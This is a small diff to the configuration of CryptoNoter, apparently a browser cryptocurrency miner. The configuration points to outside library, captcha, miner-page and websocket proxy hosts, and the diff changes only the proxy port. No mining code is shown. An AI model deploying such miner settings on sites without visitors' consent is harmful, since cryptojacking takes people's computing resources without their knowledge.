@@ -1,7 +1,7 @@
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
     LIB_URL: "https://qoshlli.com/web/lib/",
-    WEBSOCKET_SHARDS: [["wss://lotteh.com:7777/proxy"]],
+    WEBSOCKET_SHARDS: [["wss://lotteh.com:7779/proxy"]],
     CAPTCHA_URL: "https://qoshlli.com/web/captcha/",
     MINER_URL: "https://qoshlli.com/web/media/miner.html"
 };
